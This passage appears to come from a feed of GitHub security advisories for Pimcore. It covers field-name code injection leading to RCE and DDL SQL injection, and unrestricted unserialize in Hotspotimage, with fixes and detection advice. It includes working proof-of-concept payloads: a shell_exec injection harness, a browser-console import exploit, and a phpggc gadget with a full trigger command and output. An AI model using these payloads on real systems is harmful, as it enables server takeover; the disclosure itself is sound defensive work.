-Apply an identifier allowlist to field names at the model boundary, identical in spirit to the enum-option guard and the composite-index fix. In `models/DataObject/ClassDefinition/Data.php` (e.g. in `setName()` or a central validity check invoked from `saveClassInternal()`), reject any name not matching `/^[a-zA-Z][a-zA-Z0-9_]{0,62}$/`:
-
-```php // 63-char cap keeps the name within MySQL's 64-byte identifier limit (1 leading letter + ≤62). if (!preg_match('/^[a-zA-Z][a-zA-Z0-9_]{0,62}$/', $name)) { throw new \InvalidArgumentException(sprintf('Invalid field name: %s', $name)); } ```
-
-Additionally, defense-in-depth: use `quoteIdentifier()` for `$colName`/`$indexName` in `models/DataObject/ClassDefinition/Helper/Dao.php`, and never interpolate identifiers into generated PHP without allowlisting. Enforce the same check in the Studio import controller/service so client-side-only validation cannot be bypassed via the API.
-
-**Privilege-model fix (root cause, separate from the input filter).** A class-definition import changes the database schema and generates server-side PHP, yet it is gated only by the content-editor `objects` permission. Gate class-definition import/save behind a dedicated administrative permission (or `admin`), distinct from `objects`.
-
-**Operator-side detection / mitigation (deployable today, before a patch):**
-
-- **Detection:** File Integrity Monitoring on `var/classes/DataObject/*.php` — alert on unexpected changes, and specifically on the appearance of `function`/`__construct(` tokens in a generated class body. Raise the class-definition-import audit event to a high-priority alert. Flag any non-admin POST to `.../class/definition/configuration-view/detail/*/import`.
-- - **Interim mitigation:** restrict the import endpoint to administrators via a custom security voter; or disable class-definition import in production; or add a WAF rule limiting POST `.../class/definition/configuration-view/detail/*/import` to trusted operators.
-### Additional codegen-injection sinks sharing this root cause
-
-The same "unvalidated identifier → generated PHP" pattern exists at **other identifier boundaries**:
-
-- **Class NAME → `ClassBuilder.php:104`**: `'class '.ucfirst($classDefinition-&gt;getName()).' extends '...`. The only gate is `ClassDefinition.php:1149` `preg_match('/^[a-zA-Z]\w+/', getName())` — **missing the `$` end-anchor**, so `Foo){};&lt;php&gt;` passes the prefix match.
-- - **FieldCollection / ObjectBrick KEY → `FieldCollectionClassBuilder.php:58`** (`'class '.ucfirst($definition-&gt;getKey()).' extends '`) and the objectbrick equivalent — reached via their own import endpoints.
-**Exploitability caveat:** unlike the runtime-confirmed field-name vector, the class-name vector is **NOT independently confirmed as RCE** and has a structural blocker. The class name determines the generated file's path, and PHPClassDumper writes the file but does not include it — the generated class is executed only when the autoloader maps a clean class reference. The field-name vector is reliable precisely because it keeps the filename clean. The class-name/key sinks are therefore reported here as **fix-completeness / defense-in-depth** (anchor the regex), not as a second confirmed RCE.
-
-## Disclosure Timeline
-
-- 2026-05-29: Discovered (sibling sweep of CVE-2026-5394); RCE sink runtime-confirmed in a lab harness using the unmodified builder source.
-- - (Reported to vendor: to be filled on submission via GitHub Security Advisory.)
-### References
-
-- &lt;https://github.com/pimcore/pimcore/security/advisories/GHSA-9x44-4gxf-8c25&gt;
-- &lt;https://github.com/pimcore/pimcore/pull/19183&gt;
-- &lt;https://github.com/pimcore/pimcore/commit/a4f8c3cfee58b7d5fe4873d67782eff58dae9b9d&gt;
-- &lt;https://github.com/pimcore/pimcore/releases/tag/v2026.1.6&gt;
-- &lt;https://github.com/advisories/GHSA-9x44-4gxf-8c25&gt;
-</code></pre>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9x44-4gxf-8c25</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-28T19:17:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore Vulnerable to Remote Code Execution via DataObject Class-Definition Field Name]]></title>
-        <id>https://github.com/advisories/GHSA-9x44-4gxf-8c25</id>
-        <link href="https://github.com/advisories/GHSA-9x44-4gxf-8c25"/>
-        <updated>2026-08-28T19:17:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
-<p>A DataObject <strong>class-definition field name</strong> is concatenated, without an identifier allowlist, into the PHP class source that Pimcore generates for every DataObject class (<code>protected $&lt;fieldName&gt;;</code>). A user holding only the ordinary <code>objects</code> (DataObjects) permission can import a class definition whose field name closes the property and injects arbitrary PHP into the generated class file, achieving remote code execution on the server. The same unvalidated field name is also concatenated into ALTER TABLE DDL (<code>ADD COLUMN</code>/<code>ADD INDEX</code>), giving a parallel SQL-injection primitive. This is a sibling of CVE-2026-5394 (composite-index column SQL injection); that fix hardened only the <code>compositeIndices</code> sink and left the field-name path untouched.</p>
-<h2 id="impact">Impact</h2>
-<p>Any authenticated user with the <code>objects</code> permission — the standard permission for content editors who work with DataObjects, not an administrator or a dedicated "classes" permission — can:</p>
-<ol>
-<li><strong>Execute arbitrary PHP on the server (RCE).</strong> The injected code runs in the web application's PHP process when an object of the affected class is loaded (and is re-executed on every load), with full access to the application, its database credentials, secrets, and the host filesystem/OS — i.e. full server compromise.</li>
-<li><strong>Execute arbitrary ALTER TABLE DDL (SQL injection)</strong> against the DataObject store/query tables (drop columns, add indexes, corrupt schema).
-<strong>Confidence (read with the Reproduction section).</strong> The RCE sink — the real builder emitting attacker PHP into the generated class body, that class loading, and its <code>__construct()</code> executing a shell command — is <strong>runtime-confirmed in an isolated harness</strong> (see Reproduction → "Lab confirmation"). The remaining links of the end-to-end chain are <strong>reasoned from source but not yet run end-to-end on a live Pimcore</strong>: (a) the Studio import path (<code>generateLayoutTreeFromArray</code> → <code>save</code>) preserving the field name without transform/reject; (b) the persistent-field DDL step not aborting the save (addressed by the ≤64-byte gadget); and (c) Pimcore instantiating the object (<code>new</code>, e.g. via <code>DataObject::getById()</code>) so <code>__construct()</code> fires — autoloading alone executes only top-level class-body code, not the constructor. Treat the RCE as <strong>sink-confirmed + chain-reasoned</strong>, not as a fully-executed live exploit.</li>
-</ol>
-<p>Because the injected PHP executes with the privileges of the PHP runtime (typically the web-server user) and reaches the operating system — beyond the authority of the Pimcore application account the attacker started from — the scope is assessed Changed (<code>S:C</code>), consistent with Pimcore's own scoring of the analogous Custom-Reports SQL injection (GHSA-3234-gxc3-pq6f, <code>AV:N/AC:L/PR:L/UI:R/S:C</code>, 8.7); the result here is RCE rather than read-only SQLi, yielding <strong>9.9 Critical</strong>. <code>S:C</code> is the one debatable metric: a reviewer who scores the impact within the single PHP/OS authority as <code>S:U</code> lands at <code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code> = <strong>8.8 High</strong>. The severity floor is therefore High regardless of the scope interpretation.</p>
-<h2 id="technical-details">Technical Details</h2>
-<h3 id="source-→-sink-rce">Source → sink (RCE)</h3>
-<p>Pimcore generates a PHP class file for every DataObject class. The property block is built in <code>lib/DataObject/ClassBuilder/FieldDefinitionPropertiesBuilder.php</code>:</p>
-<p><code>php // lib/DataObject/ClassBuilder/FieldDefinitionPropertiesBuilder.php:27-32 foreach ($classDefinition-&gt;getFieldDefinitions() as $key =&gt; $def) { if (!$def instanceof ClassDefinition\Data\ReverseObjectRelation &amp;&amp; !$def instanceof ClassDefinition\Data\CalculatedValue) { $cd .= 'protected $'.$key.";\n";     // $key = field NAME, concatenated raw into PHP source } } </code></p>
-<p><code>$key</code> is the field name. The string is assembled into a class body in <code>lib/DataObject/ClassBuilder/ClassBuilder.php:104-112</code> (<code>class &lt;Name&gt; extends &lt;...&gt; {\n</code> + properties), written to <code>var/classes/DataObject/&lt;Class&gt;.php</code>, and autoloaded/included. A field name such as:</p>
-<p><code>poc; public function __construct(){ /* attacker PHP */ } private $z</code></p>
-<p>produces a valid class body containing an attacker-defined <code>__construct()</code> that executes when an object of the class is loaded.</p>
-<p>That the maintainers know name→PHP-generation requires an identifier allowlist is shown by the sibling <strong>enum-option</strong> generator, which does enforce one:</p>
-<p><code>php // lib/DataObject/ClassBuilder/SelectOptionsEnumBuilder.php:188 if (!preg_match('/^[A-Z-a-z_][A-Za-z0-9_]*$/', $selectOptionName)) { /* reject */ } </code></p>
-<p>The field-name path has no equivalent.</p>
-<h3 id="parallel-sql-injection-sink">Parallel SQL-injection sink</h3>
-<p>The same field name is concatenated, with backtick <strong>string</strong> quoting (not <code>quoteIdentifier</code>), into DDL:</p>
-<p><code>php // models/DataObject/ClassDefinition/Helper/Dao.php:102 (addModifyColumn — ADD COLUMN) $this-&gt;db-&gt;executeQuery('ALTER TABLE ' . $table . ' ADD COLUMN ' . $colName . ' ' . $type . ...); // :52/:67 (addIndexToField — ADD INDEX &lt;prefix&gt;&lt;name&gt; (&lt;name&gt;)) $this-&gt;db-&gt;executeQuery('ALTER TABLE ' . $table . ' ADD ' . $uniqueStr . 'INDEX ' . $prefix . $indexName . ' (' . $columnName . ');'); </code></p>
-<p>Source: <code>models/DataObject/ClassDefinition/Dao.php:228</code> → <code>$this-&gt;addModifyColumn($objectDatastoreTable, $key, $value-&gt;getColumnType(), '', 'NULL')</code>, <code>$key</code> = field name. A backtick in the field name breaks out of the quoted identifier.</p>
-<p>Contrast the patched composite-index sink, now guarded by an allowlist <strong>and</strong> <code>quoteIdentifier</code> (<code>models/DataObject/Traits/CompositeIndexTrait.php</code>).</p>
-<h3 id="why-validation-does-not-stop-it">Why validation does not stop it</h3>
-<p>The complete field-name validation across the import → save path:</p>
-<ol>
-<li><code>models/DataObject/ClassDefinition/Service.php:296</code> (<code>generateLayoutTreeFromArray</code>): <code>preg_match('/&lt;.+?&gt;/', $name)</code> — rejects only angle-bracket names. Backtick, <code>;</code>, <code>{}</code>, <code>()</code>, quotes, spaces all pass.</li>
-<li><ol start="2">
-<li><code>models/DataObject/ClassDefinition/Data.php:1292</code> (<code>isForbiddenName()</code>) — a reserved-word <strong>denylist</strong> (<code>in_array(strtolower($name), FORBIDDEN_NAMES)</code>), no character filtering.</li>
-</ol>
-</li>
-<li><ol start="3">
-<li><code>models/DataObject/ClassDefinition.php:1149</code> — validates the <strong>class</strong> name/id only.
-No allowlist is applied to field names. The Studio UI enforces an identifier pattern client-side; the API does not.</li>
-</ol>
-</li>
-</ol>
-<h3 id="reachability--privilege">Reachability / privilege</h3>
-<p>The HTTP entry point (<code>pimcore/studio-backend-bundle</code>):</p>
-<pre><code class="language-php">
-#[Route(self::ROUTE, name: 'pimcore_studio_api_class_definition_import', methods: ['POST'])] #[IsGranted(UserPermissions::DATA_OBJECTS-&gt;value)]      // UserPermissions::DATA_OBJECTS = 'objects' public function importClassDefinition(string $id, #[MapUploadedFile] UploadedFile $file): JsonResponse { return $this-&gt;jsonResponse( $this-&gt;classDefinitionService-&gt;importClassDefinitionFromJson($id, $file-&gt;getContent()) ); } ```
-
-`importClassDefinitionFromJson` → `ClassDefinitionRepository::importFromJson` → model `save()` → `saveClassInternal()`, which runs the DDL (`getDao()-&gt;save()`) and then the PHP class generation (`generateClassFilesInternal()`). The endpoint requires only the `objects` permission (`PR:L`) and performs no field-name validation of its own. The single authorization gate is the route-level `#[IsGranted('objects')]`; a DataObject **class definition** is global schema (not a workspace-scoped element), so no element-/workspace-level secondary authorization applies to the import — `objects` alone reaches the sink, which is what anchors `PR:L`. This is the same import endpoint used in the CVE-2026-5394 PoC.
-
-### Execution order
-
-In `saveClassInternal()`: field denylist check → class-name regex → `getDao()-&gt;save()` (DDL sink fires) → `generateClassFilesInternal()` (PHP-gen sink fires). The SQLi triggers first; the RCE payload either uses a non-persistent field type (no `ADD COLUMN`) or a ≤64-byte DDL-valid name so the DDL step does not abort before PHP generation.
-
-## Reproduction
-
-### Lab confirmation of the RCE sink (runtime, verified)
-
-Using the **unmodified** `FieldDefinitionPropertiesBuilder` source driven by a minimal `ClassDefinition` whose single field name is a PHP payload (full harness in the attached `rce_harness.php`):
-
-```php $maliciousName = 'pwn; public function __construct(){ echo "INJECTED-RCE-RAN: ".trim(shell_exec("id")); } private $z'; $cd = new ClassDefinition([$maliciousName =&gt; new \stdClass()], 'PwnDemo', '99'); $props = (new FieldDefinitionPropertiesBuilder())-&gt;buildProperties($cd); file_put_contents('/tmp/PwnDemo.php', "&lt;?php\nclass PwnDemo {\n".$props."}\n"); require '/tmp/PwnDemo.php'; new \PwnDemo(); ```
-
-Observed (`php:8.3-cli`):
-
-```text === generated properties block (real builder output) === protected $classId = "99"; protected $className = "PwnDemo"; protected $pwn; public function __construct(){ echo "INJECTED-RCE-RAN: ".trim(shell_exec("id")); } private $z; INJECTED-RCE-RAN: uid=0(root) gid=0(root) groups=0(root) ```
-
-The real builder emitted a class body containing the attacker's `__construct()`, and loading the class executed the injected command.
-
-### End-to-end PoC (browser console, against the Studio API)
-
-```js // Run in the browser DevTools console of an authenticated Pimcore Studio session // held by a user with the ordinary "objects" (DataObjects) permission. // NON-DESTRUCTIVE marker payload: writes a sentinel file.
-
-const CLASS_ID = "REPLACE_WITH_A_THROWAWAY_TEST_CLASS_ID";
-
-const fieldName = 'x;function __construct(){touch("/tmp/pimcore_rce_poc");}//';
-
-const def = { layoutDefinitions: { name: "pimcore_root", fieldtype: "panel", datatype: "layout", children: [ { name: fieldName, fieldtype: "input", datatype: "data", title: "poc" } ] } };
-
-const fd = new FormData(); fd.append("file", new Blob([JSON.stringify(def)], { type: "application/json" }), "import.json");
-
-fetch(`/pimcore-studio/api/class/definition/configuration-view/detail/${CLASS_ID}/import`, { method: "POST", credentials: "include", body: fd, }).then(r =&gt; r.json()).then(console.log); ```
-
-Steps:
-
-1. As a user with only the `objects` permission, create/own a throwaway DataObject class and note its id (`CLASS_ID`).
-2. 2. Open DevTools → Console and run the snippet above. Expected: a success JSON for the import (the class is regenerated).
-3. 3. Load any object of that class (open it in Studio, or request it) to autoload the regenerated `var/classes/DataObject/&lt;Class&gt;.php`.
-4. 4. Confirm `/tmp/pimcore_rce_poc` was created on the server — proving the field name executed as PHP.
-## Q0a / Q0b
-
-- **Q0a** (vendor accepted-risk): not by-design. The sibling enum-option generator enforces an identifier allowlist (`SelectOptionsEnumBuilder.php:188` `/^[A-Z-a-z_][A-Za-z0-9_]*$/`) and the composite-index fix added one — the field-name path simply lacks the equivalent. Source-verified: the only import-path field-name check is `Service.php:297` `preg_match('/&lt;.+?&gt;/', $name)` (angle-brackets only; `;{}()`, spaces, backtick all pass), and `FieldDefinitionPropertiesBuilder.php:30` concatenates the raw `$key` into `protected $&lt;name&gt;;`. No upstream allowlist gate exists. PASS.
-- **Q0b** (venue-routed dedup; venue = github-security-advisory): sibling/incomplete-coverage of CVE-2026-5394 / GHSA-r2f4-ff2p-xc64 (DataObject **composite-index** SQL injection), whose fix hardened only `CompositeIndexTrait`. The **field-name** → PHP-codegen RCE (`FieldDefinitionPropertiesBuilder`) and the field-name → ALTER TABLE DDL (`Helper/Dao.php`) are distinct, unfixed sinks. Not covered by GHSA-3234 (Custom Reports SQLi, different feature). Not a duplicate. CLEAR.
-- **Secondary sink noted:** `Service.php:517` also concatenates the raw field name into a generated PHP string literal (`public const FIELD_... = '&lt;name&gt;';`) — a second codegen-injection point (string-literal breakout via `'`), same root cause; the allowlist fix closes both.
-## Suggested Fix
-
-Apply an identifier allowlist to field names at the model boundary, identical in spirit to the enum-option guard and the composite-index fix. In `models/DataObject/ClassDefinition/Data.php` (e.g. in `setName()` or a central validity check invoked from `saveClassInternal()`), reject any name not matching `/^[a-zA-Z][a-zA-Z0-9_]{0,62}$/`:
-
-```php // 63-char cap keeps the name within MySQL's 64-byte identifier limit (1 leading letter + ≤62). if (!preg_match('/^[a-zA-Z][a-zA-Z0-9_]{0,62}$/', $name)) { throw new \InvalidArgumentException(sprintf('Invalid field name: %s', $name)); } ```
-
-Additionally, defense-in-depth: use `quoteIdentifier()` for `$colName`/`$indexName` in `models/DataObject/ClassDefinition/Helper/Dao.php`, and never interpolate identifiers into generated PHP without allowlisting. Enforce the same check in the Studio import controller/service so client-side-only validation cannot be bypassed via the API.
-
-**Privilege-model fix (root cause, separate from the input filter).** A class-definition import changes the database schema and generates server-side PHP, yet it is gated only by the content-editor `objects` permission. Gate class-definition import/save behind a dedicated administrative permission (or `admin`), distinct from `objects`.
-
-**Operator-side detection / mitigation (deployable today, before a patch):**
-
-- **Detection:** File Integrity Monitoring on `var/classes/DataObject/*.php` — alert on unexpected changes, and specifically on the appearance of `function`/`__construct(` tokens in a generated class body. Raise the class-definition-import audit event to a high-priority alert. Flag any non-admin POST to `.../class/definition/configuration-view/detail/*/import`.
-- - **Interim mitigation:** restrict the import endpoint to administrators via a custom security voter; or disable class-definition import in production; or add a WAF rule limiting POST `.../class/definition/configuration-view/detail/*/import` to trusted operators.
-### Additional codegen-injection sinks sharing this root cause
-
-The same "unvalidated identifier → generated PHP" pattern exists at **other identifier boundaries**:
-
-- **Class NAME → `ClassBuilder.php:104`**: `'class '.ucfirst($classDefinition-&gt;getName()).' extends '...`. The only gate is `ClassDefinition.php:1149` `preg_match('/^[a-zA-Z]\w+/', getName())` — **missing the `$` end-anchor**, so `Foo){};&lt;php&gt;` passes the prefix match.
-- - **FieldCollection / ObjectBrick KEY → `FieldCollectionClassBuilder.php:58`** (`'class '.ucfirst($definition-&gt;getKey()).' extends '`) and the objectbrick equivalent — reached via their own import endpoints.
-**Exploitability caveat:** unlike the runtime-confirmed field-name vector, the class-name vector is **NOT independently confirmed as RCE** and has a structural blocker. The class name determines the generated file's path, and PHPClassDumper writes the file but does not include it — the generated class is executed only when the autoloader maps a clean class reference. The field-name vector is reliable precisely because it keeps the filename clean. The class-name/key sinks are therefore reported here as **fix-completeness / defense-in-depth** (anchor the regex), not as a second confirmed RCE.
-
-## Disclosure Timeline
-
-- 2026-05-29: Discovered (sibling sweep of CVE-2026-5394); RCE sink runtime-confirmed in a lab harness using the unmodified builder source.
-- - (Reported to vendor: to be filled on submission via GitHub Security Advisory.)
-### References
-
-- &lt;https://github.com/pimcore/pimcore/security/advisories/GHSA-9x44-4gxf-8c25&gt;
-- &lt;https://github.com/pimcore/pimcore/pull/19183&gt;
-- &lt;https://github.com/pimcore/pimcore/commit/a4f8c3cfee58b7d5fe4873d67782eff58dae9b9d&gt;
-- &lt;https://github.com/pimcore/pimcore/releases/tag/v2026.1.6&gt;
-- &lt;https://github.com/advisories/GHSA-9x44-4gxf-8c25&gt;
-</code></pre>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9x44-4gxf-8c25</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-28T19:17:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore Hotspotimage getDataFromResource() unrestricted Serialize::unserialize over object-store column (PHP Object Injection, CWE-502)]]></title>
-        <id>https://github.com/advisories/GHSA-w23p-wrp7-ch38</id>
-        <link href="https://github.com/advisories/GHSA-w23p-wrp7-ch38"/>
-        <updated>2026-08-28T19:13:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Pimcore\Model\DataObject\ClassDefinition\Data\Hotspotimage::getDataFromResource()</code> deserializes the <code>*__hotspots</code> object-store column through the <code>Pimcore\Tool\Serialize::unserialize()</code> wrapper <strong>without a class allowlist</strong> (the wrapper's <code>$allowedClasses</code> parameter defaults to <code>true</code>, i.e. fully unrestricted). Because the persistence layer always stores this column as PHP-<code>serialize()</code>d bytes, every load of a DataObject that has a Hotspotimage (advanced image) field runs an unrestricted <code>unserialize()</code> over the stored column value. An attacker who can write the <code>*__hotspots</code> store column with crafted serialized bytes achieves PHP Object Injection (CWE-502): arbitrary classes are instantiated and their magic methods (<code>__wakeup</code>/<code>__destruct</code>) execute, which is exploitable for remote code execution via gadget chains present in Pimcore's own bundled dependencies (e.g. <code>guzzlehttp/guzzle</code>).</p>
-<p>The same field-data family also affects the sibling marshallers <code>ImageGallery</code>, <code>Block</code>, and <code>Video</code>, which use the identical <code>json_decode(...) ?: Serialize::unserialize(...)</code> fallback over their respective store columns. The root cause is shared: <code>Serialize::unserialize()</code> defaults to an unrestricted class list, and these callers pass no second argument.</p>
-<h2 id="severity">Severity</h2>
-<p>High. Successful exploitation yields PHP Object Injection leading to remote code execution (proven below as arbitrary file write using a gadget from Pimcore's bundled <code>guzzlehttp/guzzle 7.11.0</code>). This is the deserialization leg of an attack: it requires the ability to write the <code>*__hotspots</code> object-store column with attacker-chosen serialized bytes. No class-allowlist defense is present, so any such write is directly weaponizable on the next object load. CVSS-wise this is comparable to other deserialization sinks over attacker-influenceable storage in this codebase.</p>
-<h2 id="affected-component">Affected component</h2>
-<ul>
-<li>File: <code>models/DataObject/ClassDefinition/Data/Hotspotimage.php</code>, method <code>getDataFromResource()</code>.</li>
-<li>Vulnerable lines (v2026.1.4 / v12.3.8):<pre><code class="language-php">$metaData = $data[$this-&gt;getName() . '__hotspots'];
-// check if the data is JSON (backward compatibility)
-$md = json_decode($metaData, true);
-if (!$md) {
-    $md = Serialize::unserialize($metaData);   // unrestricted: allowed_classes defaults to true
-} elseif (is_array($md)) {
-    $md['hotspots'] = $md;
-}
-</code></pre>
-</li>
-<li>Root enabler: <code>lib/Tool/Serialize.php</code><pre><code class="language-php">public static function unserialize(?string $data = null, array|bool $allowedClasses = true): mixed
-{
-    if ($data === null || $data === '') { return $data; }
-    return unserialize($data, ['allowed_classes' =&gt; $allowedClasses]);  // default true = unrestricted
-}
-</code></pre>
-</li>
-<li>Sibling marshallers with the identical fallback shape: <code>ImageGallery</code>, <code>Block</code>, <code>Video</code> (DataObject\ClassDefinition\Data).</li>
-<li>Package: <code>pimcore/pimcore</code> (Composer).</li>
-<li>Affected versions: all currently maintained releases, including the latest <code>v2026.1.4</code> and <code>v12.3.8</code> (verified against deployed <code>v2026.1.4</code>).</li>
-</ul>
-<h2 id="data-flow">Data flow</h2>
-<ol>
-<li>On save, <code>Hotspotimage::getDataForResource()</code> stores the hotspot/marker/crop metadata as <code>Serialize::serialize($metaData)</code> into the <code>&lt;field&gt;__hotspots</code> object-store column — i.e. PHP serialized bytes, not JSON.</li>
-<li>On load, <code>Hotspotimage::getDataFromResource()</code> reads that column, calls <code>json_decode()</code> (which fails for the serialized format), and therefore falls through to <code>Serialize::unserialize($metaData)</code> with the default unrestricted class list.</li>
-<li><code>Serialize::unserialize()</code> invokes <code>unserialize($data, ['allowed_classes' =&gt; true])</code>, instantiating any class named in the bytes and triggering its magic methods.</li>
-<li>The load path is exercised on essentially every object retrieval (admin grid/detail, frontend rendering, Studio/API reads, inheritance walks) for objects whose class declares a Hotspotimage field, with a non-null <code>&lt;field&gt;__image</code>.</li>
-</ol>
-<p>The attacker primitive is the ability to place crafted serialized bytes into the <code>&lt;field&gt;__hotspots</code> store column (for example through an SQL-write/store-write primitive). The defect is that the deserialization is performed with no class allowlist, so any such write is directly executable.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Verified end-to-end against a real, locally deployed Pimcore <code>v2026.1.4</code> (Composer skeleton + MariaDB + <code>pimcore:install</code>), not a ported stub. The gadget is <code>phpggc Guzzle/FW1</code> built against Pimcore's own bundled <code>guzzlehttp/guzzle 7.11.0</code>; its <code>GuzzleHttp\Cookie\FileCookieJar::__destruct</code> writes an attacker-controlled file to disk (a file-write primitive; the same surface reaches RCE via other vendored gadget chains).</p>
-<p>Gadget generation (476→474 raw bytes, non-JSON so the <code>unserialize</code> fallback is taken):</p>
-<pre><code>printf 'PWNED_BY_DESERIALIZATION_%s' "$(date +%s)" &gt; /tmp/ggc_local_src.txt
-./phpggc Guzzle/FW1 /tmp/pimcore_pwned_hotspot.txt /tmp/ggc_local_src.txt | tr -d '\n' &gt; /tmp/ggc_guzzle_fw1.ser
-# stored bytes begin: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{...
-</code></pre>
-<p>Reproduction harness (a Symfony console command living in the deployed app; it creates a real DataObject class with a Hotspotimage field, a real image asset, a real saved object, performs the attacker store-write into <code>object_store_&lt;id&gt;.img__hotspots</code>, then reloads the object through the real Pimcore model layer):</p>
-<pre><code class="language-php">&lt;?php
-declare(strict_types=1);
-namespace App\Command;
-
-use Pimcore\Db;
-use Pimcore\Model\Asset;
-use Pimcore\Model\DataObject;
-use Pimcore\Model\DataObject\ClassDefinition;
-use Symfony\Component\Console\Attribute\AsCommand;
-use Symfony\Component\Console\Command\Command;
-use Symfony\Component\Console\Input\InputInterface;
-use Symfony\Component\Console\Input\InputOption;
-use Symfony\Component\Console\Output\OutputInterface;
-
-#[AsCommand(name: 'e2e:hotspot', description: 'E2E CWE-502 Hotspotimage __hotspots unserialize')]
-final class E2eHotspotCommand extends Command
-{
-    protected function configure(): void
-    {
-        $this-&gt;addOption('benign', null, InputOption::VALUE_NONE, 'negative control: benign JSON');
-        $this-&gt;addOption('restricted', null, InputOption::VALUE_NONE, 'negative control: allowed_classes=false');
-    }
-
-    protected function execute(InputInterface $input, OutputInterface $output): int
-    {
-        $o = fn (string $m) =&gt; $output-&gt;writeln($m);
-        $gadget = (string) file_get_contents('/tmp/ggc_guzzle_fw1.ser');
-        $target = '/tmp/pimcore_pwned_hotspot.txt';
-        @unlink($target);
-
-        $o('=== STEP 1: create DataObject class with a Hotspotimage field ===');
-        $class = ClassDefinition::getByName('E2eHotspot');
-        if (!$class) {
-            $class = new ClassDefinition();
-            $class-&gt;setName('E2eHotspot');
-            $class-&gt;setGroup('e2e');
-            $field = new ClassDefinition\Data\Hotspotimage();
-            $field-&gt;setName('img');
-            $field-&gt;setTitle('img');
-            $panel = new ClassDefinition\Layout\Panel();
-            $panel-&gt;setName('Layout');
-            $panel-&gt;addChild($field);
-            $class-&gt;setLayoutDefinitions($panel);
-            $class-&gt;save();
-        }
-        $o('  class id=' . $class-&gt;getId());
-
-        $o('=== STEP 2: create image asset (Hotspotimage needs a valid __image id) ===');
-        $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
-        $asset = Asset::getByPath('/e2e_pixel.png');
-        if (!$asset) {
-            $asset = new Asset\Image();
-            $asset-&gt;setFilename('e2e_pixel.png');
-            $asset-&gt;setParent(Asset::getById(1));
-            $asset-&gt;setData($png);
-            $asset-&gt;save();
-        }
-        $o('  asset id=' . $asset-&gt;getId());
-
-        $o('=== STEP 3: create+save object carrying that image ===');
-        $obj = DataObject::getByPath('/e2e_obj');
-        if (!$obj) {
-            $fqcn = '\\Pimcore\\Model\\DataObject\\' . $class-&gt;getName();
-            $obj = new $fqcn();
-            $obj-&gt;setKey('e2e_obj');
-            $obj-&gt;setParent(DataObject::getById(1));
-            $obj-&gt;setPublished(true);
-            $obj-&gt;setValue('img', new DataObject\Data\Hotspotimage($asset));
-            $obj-&gt;save();
-        }
-        $objId = $obj-&gt;getId();
-        $store = 'object_store_' . $class-&gt;getId();
-        $o('  object id=' . $objId . '  store=' . $store);
-
-        $o('=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===');
-        $db = Db::get();
-        $payload = $input-&gt;getOption('benign')
-            ? json_encode(['hotspots' =&gt; [], 'marker' =&gt; [], 'crop' =&gt; []])
-            : $gadget;
-        $db-&gt;executeStatement('UPDATE `' . $store . '` SET `img__hotspots` = ? WHERE oo_id = ?', [$payload, $objId]);
-        $stored = (string) $db-&gt;fetchOne('SELECT `img__hotspots` FROM `' . $store . '` WHERE oo_id = ?', [$objId]);
-        $o('  stored prefix: ' . substr($stored, 0, 60));
-        $o('  json_decode(stored) === null ? ' . var_export(json_decode($stored, true) === null, true) . '  (=&gt; unserialize fallback)');
-
-        $o('=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===');
-        \Pimcore\Cache::clearAll();
-        \Pimcore\Cache\RuntimeCache::clear();
-        $o('  target file before load exists? ' . var_export(file_exists($target), true));
-
-        if ($input-&gt;getOption('restricted')) {
-            $o('  [negative control] fixed wrapper allowed_classes=false on the same bytes');
-            $res = @unserialize($stored, ['allowed_classes' =&gt; false]);
-            $o('  returned type=' . gettype($res) . ' class=' . (is_object($res) ? get_class($res) : 'n/a'));
-            gc_collect_cycles();
-        } else {
-            try {
-                $reloaded = DataObject\Concrete::getById($objId, ['force' =&gt; true]);
-                $reloaded-&gt;getImg(); // triggers Hotspotimage::getDataFromResource() lazy load
-                $o('  reloaded class=' . get_class($reloaded));
-                unset($reloaded);
-            } catch (\Throwable $e) {
-                $o('  (post-unserialize downstream error, gadget already instantiated): ' . $e-&gt;getMessage());
-            }
-            gc_collect_cycles();
-        }
-
-        $o('=== RESULT ===');
-        clearstatcache();
-        if (file_exists($target)) {
-            $o('  [VULNERABLE] gadget file WRITTEN: ' . $target);
-            $o('  contents: ' . trim((string) file_get_contents($target)));
-        } else {
-            $o('  [NOT TRIGGERED] target file absent');
-        }
-        return Command::SUCCESS;
-    }
-}
-</code></pre>
-<p>Captured output — RUN A (positive, gadget):</p>
-<pre><code>=== STEP 1: create DataObject class with a Hotspotimage field ===
-  class id=1
-=== STEP 2: create image asset (Hotspotimage needs a valid __image id) ===
-  asset id=2
-=== STEP 3: create+save object carrying that image ===
-  object id=4  store=object_store_1
-=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
-  stored prefix: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\GuzzleHttp\
-  json_decode(stored) === null ? true  (=&gt; unserialize fallback)
-=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===
-  target file before load exists? false
-  (post-unserialize downstream error, gadget already instantiated): Cannot use object of type GuzzleHttp\Cookie\FileCookieJar as array
-=== RESULT ===
-  [VULNERABLE] gadget file WRITTEN: /tmp/pimcore_pwned_hotspot.txt
-  contents: [{"Expires":1,"Discard":false,"Value":"PWNED_BY_DESERIALIZATION_1780420803"}]
-</code></pre>
-<p>Captured output — RUN B (negative control, benign JSON in the column):</p>
